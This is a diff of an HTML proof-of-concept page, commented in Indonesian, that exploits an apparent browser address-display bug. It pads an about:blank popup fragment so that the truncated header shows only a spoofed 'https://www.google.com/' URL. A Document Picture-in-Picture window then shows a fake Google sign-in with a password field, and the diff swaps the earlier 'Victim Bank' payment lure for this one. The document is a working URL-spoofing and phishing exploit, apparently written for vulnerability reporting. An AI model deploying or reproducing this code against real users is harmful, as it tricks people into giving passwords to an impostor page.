@@ -5,7 +5,6 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <script>
-        // Dua klik: klik pertama membuka popup about:blank#<payload>, klik kedua memicu requestWindow di dalam popup
         let step = 0;
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -13,15 +12,17 @@
                 step++;
 
                 if (step === 1) {
-                    // Klik pertama: buka popup, fragment berisi URL palsu
-                    // about:blank memiliki host kosong, getUrlString() akan fallback ke full spec
-                    // TruncateAt.START membuat header hanya menampilkan …https://victim-bank.com/pay
-                    const payload = '' + 'a'.repeat(300) + '?.--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------https://google.com/pay';
-                    const popup = window.open('---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------google.com#' + payload, 'poc', 'width=400,height=400');
+                    // Klik pertama: buka popup about:blank dengan fragment yang berisi URL palsu
+                    // Inti kerentanan: host about:blank kosong, getUrlString() fallback ke seluruh spec
+                    // TruncateAt.START memotong awal, hanya menyisakan …https://www.google.com/
+                    const padding = '/'.repeat(300);
+                    const spoofedUrl = 'https://www.google.com/';
+                    const payload = padding + spoofedUrl;
+                    const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');
 
-                    // Isi popup dengan tombol penipuan (menggunakan DOM API, bukan document.write, agar URL tidak di-reset)
+                    // Isi popup dengan tombol penipuan (menggunakan DOM API, jangan document.write, jika tidak URL akan di-reset)
                     popup.document.body.innerHTML = `
-                        <h1 style="color:#333;">Verifikasi Pembayaran</h1>
+                        <h1 style="color:#333;">Verifikasi Keamanan</h1>
                         <p>Silakan ketuk untuk melanjutkan</p>
                         <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                     `;
@@ -29,7 +30,6 @@
                     // Klik kedua terjadi di dalam popup
                     popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                         try {
-                            // Meminta Document PiP (memerlukan gesture pengguna)
                             const pipWin = await documentPictureInPicture.requestWindow({
                                 width: 220,
                                 height: 300
@@ -37,10 +37,10 @@
 
                             // Menulis konten penipuan ke dalam jendela PiP
                             pipWin.document.body.innerHTML = `
-                                <h2 style="color:red;">Victim Bank</h2>
-                                <p>Verifikasi pembayaran $500.00</p>
+                                <h2 style="color:red;">Google</h2>
+                                <p>Verifikasi akun Anda</p>
                                 <input type="password" placeholder="Kata sandi" style="width:100%;">
-                                <button>Konfirmasi</button>
+                                <button>Masuk</button>
                             `;
                         } catch (e) {
                             console.log('PiP gagal:', e.message);
